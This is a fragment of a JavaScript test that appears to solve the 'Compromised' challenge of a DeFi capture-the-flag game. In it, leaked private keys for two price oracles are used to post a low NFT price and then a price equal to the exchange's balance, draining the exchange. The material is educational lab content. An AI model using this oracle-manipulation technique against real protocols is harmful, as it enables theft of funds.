...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {
        // the two strings in the website are hex b64 encoded private keys for two of the oracles
        // attacker can manipulate nft price in exchange
        ...
        await this.oracle.connect(source1).postPrice("DVNFT", buyPrice);
        await this.oracle.connect(source2).postPrice("DVNFT", buyPrice);
        ...
        await this.oracle.connect(source1).postPrice("DVNFT", exchangeBalance);
        await this.oracle.connect(source2).postPrice("DVNFT", exchangeBalance);
